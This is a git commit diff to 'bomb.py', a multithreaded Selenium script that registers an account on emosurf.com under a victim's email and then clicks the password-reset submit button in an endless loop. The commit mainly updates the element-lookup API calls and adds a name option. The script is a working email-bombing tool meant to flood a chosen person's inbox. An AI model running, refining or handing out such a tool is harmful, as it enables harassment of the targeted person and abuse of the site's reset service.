d26c1ecf8f616238f461466e45312b785eb58e78
graythze <54765502+graythze@users.noreply.github.com>
2022-07-27 12:11:27 +0500

    Replace find_element_by_xpath() to find_element()

--- bomb.py
+++ bomb.py
@@ -2,7 +2,8 @@
 # -*- coding: utf-8 -*
 
 from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.firefox.options import Options
 import threading
 import argparse
 import time
@@ -22,6 +23,10 @@ parser.add_argument('-w', '--webdriver',
                     type=str,
                     default='chrome',
                     help='Choose chrome or firefox webdriver (Chrome is set by default)')
+parser.add_argument('-n', '--name',
+                    type=str,
+                    default='John Doe',
+                    help='Set a name for account')
 args = parser.parse_args()
 
 
@@ -48,34 +53,33 @@ def spam():
     driver.get('https://emosurf.com/')
     # click sub button
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[7]/button').click()
-
+    driver.find_element(by=By.XPATH, value='/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[7]/button').click()
     # fill email and password
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(args.victim)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys('John Doe')
+    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[1]/input').send_keys(args.victim)
+    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[2]/input').send_keys(str(args.name))
 
     # make some clicks to send things to server
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/form/div[3]/table/tbody/tr/td[1]/button').click()
+    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[2]/form/div[3]/table/tbody/tr/td[1]/button').click()
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[3]/div[3]/button').click()
+    driver.find_element(by=By.XPATH, value='/html/body/div[3]/div[3]/button').click()
 
     # click person image
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[3]/img').click()
+    driver.find_element(by=By.XPATH, value='/html/body/div[4]/div/table/tbody/tr/td[2]/table/tbody/tr/td[3]/img').click()
 
     # click forgot password text
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[4]/form/div[3]/a').click()
+    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[4]/form/div[3]/a').click()
 
     # enter email
     time.sleep(1)
-    driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(args.victim)
+    driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[6]/form/div[1]/input').send_keys(args.victim)
 
     while True:
         # click submit button
-        driver.find_element_by_xpath('/html/body/div[5]/div/div[6]/form/div[2]/button').click()
-        print('SENT TIME - ' + str(time.time()))
+        driver.find_element(by=By.XPATH, value='/html/body/div[5]/div/div[6]/form/div[2]/button').click()
+        print(str(time.time()))
 
 
 for k in range(args.threads):
